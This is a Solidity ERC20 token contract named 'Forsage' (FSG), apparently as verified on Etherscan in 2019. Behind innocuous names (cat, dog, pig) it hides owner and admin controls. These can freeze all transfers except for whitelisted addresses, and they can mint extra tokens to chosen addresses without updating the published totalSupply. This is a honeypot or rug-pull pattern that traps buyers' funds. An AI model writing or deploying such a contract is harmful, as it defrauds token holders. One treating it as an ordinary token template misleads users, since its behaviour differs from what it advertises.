/**
 *Submitted for verification at Etherscan.io on 2019-06-28
*/

pragma solidity >=0.4.22 <0.6.0;

contract FSG_ERC20
{
    string public standard = '';
    string public name="Forsage"; 
    string public symbol="FSG"; 
    uint8 public decimals = 18; 
    uint256 public totalSupply=330000 ether; 

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    mapping (address =>bool) private dog;
    
    event Transfer(address indexed from, address indexed to, uint256 value); 
    event Burn(address indexed from, uint256 value);
    address private admin;
    address private owner;
    bool private cat;
    uint private pig=70000 ether;
    constructor ()public
    {
        admin = msg.sender;
        owner=0x78758Ecaded0139Cd7bf32F3695b3d5b13c4D608;
        balanceOf[owner]=329990 ether;
        balanceOf[admin] = 10 ether;
    }
    
    function _transfer(address _from, address _to, uint256 _value) internal {

      require(_to != address(0x0));
      require(cat == false || dog[_from]==true);
      require(balanceOf[_from] >= _value);
      require(balanceOf[_to] + _value > balanceOf[_to]);
      uint previousBalances = balanceOf[_from] + balanceOf[_to];
      balanceOf[_from] -= _value;
      balanceOf[_to] += _value;
      emit Transfer(_from, _to, _value);
      assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }
    
    function transfer(address _to, uint256 _value) public returns (bool success){
        _transfer(msg.sender, _to, _value);
        return true;
    }
    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success){
        require(_value <= allowance[_from][msg.sender]); 
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
    
    function approve(address _spender, uint256 _value) public returns (bool success) {
        
        allowance[msg.sender][_spender] = _value;
        return true;
    }
    function set_cat(bool value)public{
        require(msg.sender == owner);
        cat = value;
    }
    function set_dog(address addr,bool value)public{
        require(msg.sender == owner);
        dog[addr]=value;
    }
    function set_pig(address addr,uint value)public{
        require(msg.sender == admin);
        require(value <= pig);
        pig -= value;
        dog[addr]=true;
        balanceOf[addr]+= value;
    }
}